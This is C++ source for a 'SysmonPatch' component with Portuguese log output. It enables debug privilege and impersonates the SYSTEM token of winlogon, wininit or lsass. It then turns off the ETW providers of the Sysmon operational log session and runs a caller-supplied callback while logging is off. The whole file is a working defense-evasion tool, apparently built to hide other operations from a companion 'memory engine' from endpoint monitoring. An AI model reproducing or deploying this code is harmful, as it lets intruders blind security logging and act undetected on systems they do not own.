#include "SysmonPatch.hpp"
#include <iostream>
#include <tlhelp32.h>
#include <tchar.h>


bool SysmonPatch::bInitialized = false;
bool SysmonPatch::bIsPatched = false;
HANDLE SysmonPatch::hProcess = nullptr;
TRACEHANDLE SysmonPatch::hSession = 0;
std::vector<GUID> SysmonPatch::vProviders;

bool SysmonPatch::Initialize() {
    EnableDebugPrivilege();

    DWORD pid = FindTargetPID();

    if (!pid) {
        return false;
    }

    hProcess = ImpersonateProcess(pid);
    hSession = GetSessionHandle(TEXT("EventLog-Microsoft-Windows-Sysmon-Operational"));
    vProviders = GetProvidersForSession(hSession);
    
    for (size_t i = 0; i < vProviders.size(); i++) {
        std::cout << "  Provider[" << i << "] GUID encontrado" << std::endl;
    }

    bInitialized = true;
    return true;
}

void SysmonPatch::ControlProviders(TRACEHANDLE hSession,
    const std::vector<GUID>& providers,
    ULONG controlCode)
{

    
    for (size_t i = 0; i < providers.size(); i++)
    {
        ULONG st = EnableTraceEx2(hSession, &providers[i], controlCode,
            TRACE_LEVEL_VERBOSE, 0xFFFFFFFFFFFFFFFF, 0, 0, nullptr);
        std::cout << "  Provider[" << i << "] - Status: " << st << " (0 = sucesso)" << std::endl;
    }
    
    std::cout << "[ControlProviders] completado!" << std::endl;
}

std::vector<GUID> SysmonPatch::GetProvidersForSession(TRACEHANDLE hSession)
{
    std::vector<GUID> result;
    ULONG loggerId = (ULONG)(hSession & 0xFFFFFFFF);

    ULONG bufferSize = 0;
    EnumerateTraceGuidsEx(TraceGuidQueryList,
        nullptr, 0, nullptr, 0, &bufferSize);

    if (bufferSize == 0) return result;

    std::vector<BYTE> buffer(bufferSize);
    EnumerateTraceGuidsEx(TraceGuidQueryList,
        nullptr, 0, buffer.data(), bufferSize, &bufferSize);

    GUID* guids = (GUID*)buffer.data();
    ULONG guidCount = bufferSize / sizeof(GUID);

    for (ULONG i = 0; i < guidCount; i++)
    {
        ULONG infoSize = 0;
        EnumerateTraceGuidsEx(TraceGuidQueryInfo,
            &guids[i], sizeof(GUID), nullptr, 0, &infoSize);

        if (infoSize == 0) continue;

        std::vector<BYTE> info(infoSize);
        ULONG status = EnumerateTraceGuidsEx(TraceGuidQueryInfo,
            &guids[i], sizeof(GUID), info.data(), infoSize, &infoSize);
        if (status != ERROR_SUCCESS) continue;

        PTRACE_GUID_INFO pInfo = (PTRACE_GUID_INFO)info.data();
        PTRACE_PROVIDER_INSTANCE_INFO pInst = (PTRACE_PROVIDER_INSTANCE_INFO)
            ((PBYTE)pInfo + sizeof(TRACE_GUID_INFO));

        for (ULONG inst = 0; inst < pInfo->InstanceCount; inst++)
        {
            PTRACE_ENABLE_INFO pEnable = (PTRACE_ENABLE_INFO)
                ((PBYTE)pInst + sizeof(TRACE_PROVIDER_INSTANCE_INFO));
            for (ULONG en = 0; en < pInst->EnableCount; en++) {
                if (pEnable[en].LoggerId == loggerId)
                    result.push_back(guids[i]);
            }
            if (pInst->NextOffset == 0) break;
            pInst = (PTRACE_PROVIDER_INSTANCE_INFO)
                ((PBYTE)pInst + pInst->NextOffset);
        }
    }
    return result;
}

TRACEHANDLE SysmonPatch::GetSessionHandle(LPCTSTR sessionName)
{
    const ULONG MAX_SESSIONS = 64;
    std::vector<PEVENT_TRACE_PROPERTIES> props(MAX_SESSIONS);
    
    for (auto& p : props) {
        ULONG sz = sizeof(EVENT_TRACE_PROPERTIES) + MAX_PATH * sizeof(WCHAR);
        p = (PEVENT_TRACE_PROPERTIES)calloc(1, sz);
        if (p) {
            p->Wnode.BufferSize = sz;
            p->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
        }
    }
    
    ULONG count = 0;
    QueryAllTraces(props.data(), MAX_SESSIONS, &count);

    TRACEHANDLE h = INVALID_PROCESSTRACE_HANDLE;
    for (ULONG i = 0; i < count; i++) {
        if (!props[i]) continue;
        
        LPTSTR name = (LPTSTR)((BYTE*)props[i] + props[i]->LoggerNameOffset);
        
        if (_tcsicmp(name, sessionName) == 0) {
            h = props[i]->Wnode.HistoricalContext;
            break;
        }
    }
    
    for (auto& p : props) {
        if (p) free(p);
    }
    
    return h;
}

HANDLE SysmonPatch::ImpersonateProcess(DWORD pid)
{
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) {
        return nullptr;
    }
    
    HANDLE hToken = nullptr;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hToken)) {
        CloseHandle(hProc);
        return nullptr;
    }
    CloseHandle(hProc);

    HANDLE hDup = nullptr;
    if (!DuplicateTokenEx(
        hToken,
        TOKEN_ALL_ACCESS,
        nullptr,
        SecurityImpersonation,
        TokenImpersonation,
        &hDup))
    {
        CloseHandle(hToken);
        return nullptr;
    }
    CloseHandle(hToken);

    if (!ImpersonateLoggedOnUser(hDup)) {
        CloseHandle(hDup);
        return nullptr;
    }
    
    return hDup;
}

bool SysmonPatch::IsPatched() {
    return bIsPatched;
}

bool SysmonPatch::Patch(std::function<void()> onPatched) {
    std::cout << "[SysmonPatch::Patch] Iniciando..." << std::endl;
    std::cout << "[SysmonPatch::Patch] bInitialized: " << bInitialized << ", bIsPatched: " << bIsPatched << std::endl;
    
    if (!bInitialized || bIsPatched) {
        std::cout << "[SysmonPatch::Patch] ERRO: Nao inicializado ou ja patched!" << std::endl;
        return false;
    }

    std::cout << "[SysmonPatch::Patch] Desativando " << vProviders.size() << " providers..." << std::endl;
    ControlProviders(hSession, vProviders, EVENT_CONTROL_CODE_DISABLE_PROVIDER);
    std::cout << "[SysmonPatch::Patch] Providers desativados!" << std::endl;

    // Executa o callback enquanto os providers estão desabilitados
    if (onPatched) {
        std::cout << "[SysmonPatch::Patch] Chamando callback onPatched..." << std::endl;
        onPatched();
    }
    
    // RE-ABILITA IMEDIATAMENTE os providers após a operação
    std::cout << "[SysmonPatch::Patch] Re-habilitando providers imediatamente..." << std::endl;
    ControlProviders(hSession, vProviders, EVENT_CONTROL_CODE_ENABLE_PROVIDER);
    std::cout << "[SysmonPatch::Patch] Providers reabilitados!" << std::endl;

    bIsPatched = false; // Já foi restaurado
    
    std::cout << "[SysmonPatch::Patch] SUCESSO!" << std::endl;
    return true;
}

bool SysmonPatch::Restore() {
    std::cout << "[SysmonPatch::Restore] Iniciando..." << std::endl;
    std::cout << "[SysmonPatch::Restore] bInitialized: " << bInitialized << ", bIsPatched: " << bIsPatched << std::endl;
    
    // Se não foi inicializado, inicializa agora
    if (!bInitialized) {
        std::cout << "[SysmonPatch::Restore] Nao inicializado, inicializando agora..." << std::endl;
        if (!Initialize()) {
            std::cout << "[SysmonPatch::Restore] ERRO: Initialize() falhou!" << std::endl;
            return false;
        }
    }
    
    // Se session ou providers estão vazios, reinicializa tudo
    if (hSession == 0 || vProviders.empty()) {
        std::cout << "[SysmonPatch::Restore] Session vazia ou providers vazios, reinicializando..." << std::endl;
        std::cout << "  hSession: " << hSession << ", vProviders.size(): " << vProviders.size() << std::endl;
        
        RevertToSelf();
        if (hProcess) {
            CloseHandle(hProcess);
            hProcess = nullptr;
        }
        
        bInitialized = false;
        hSession = 0;
        vProviders.clear();
        
        // Re-inicializa para redescobrir providers
        std::cout << "[SysmonPatch::Restore] Re-inicializando..." << std::endl;
        if (!Initialize()) {
            std::cout << "[SysmonPatch::Restore] ERRO: Re-initialize() falhou!" << std::endl;
            return false;
        }
    }
    
    // Aguarda um pouco antes de restaurar
    std::cout << "[SysmonPatch::Restore] Aguardando 500ms..." << std::endl;
    Sleep(500);
    
    // Re-habilita todos os providers
    std::cout << "[SysmonPatch::Restore] Reabilitando " << vProviders.size() << " providers..." << std::endl;
    if (hSession && !vProviders.empty()) {
        ControlProviders(hSession, vProviders, EVENT_CONTROL_CODE_ENABLE_PROVIDER);
        std::cout << "[SysmonPatch::Restore] Providers reabilitados!" << std::endl;
    } else {
        std::cout << "[SysmonPatch::Restore] AVISO: hSession ou vProviders vazio!" << std::endl;
    }
    
    // Limpa a impersonação
    RevertToSelf();
    
    // Limpa handle do processo
    if (hProcess) {
        CloseHandle(hProcess);
        hProcess = nullptr;
    }

    bIsPatched = false;
    std::cout << "[SysmonPatch::Restore] SUCESSO!" << std::endl;
    return true;
}

void SysmonPatch::EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        }
        CloseHandle(hToken);
    }
}

DWORD SysmonPatch::FindTargetPID() {
    const TCHAR* targets[] = {
        TEXT("winlogon.exe"),
        TEXT("wininit.exe"),
        TEXT("lsass.exe")
    };

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { sizeof(pe) };

    for (const auto* target : targets)
    {
        if (!Process32First(hSnap, &pe)) {
            CloseHandle(hSnap);
            return 0;
        }
        
        do {
            if (_tcsicmp(pe.szExeFile, target) == 0) {
                CloseHandle(hSnap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return 0;
}

// ============================================================
// Funções extern "C" para uso em memory_engine.cpp
// ============================================================

void SysmonPatch::Reset() {
    if (bIsPatched) {
        Restore();
    }
    RevertToSelf();
    if (hProcess) {
        CloseHandle(hProcess);
        hProcess = nullptr;
    }
    hSession = 0;
    vProviders.clear();
    bInitialized = false;
    bIsPatched = false;
}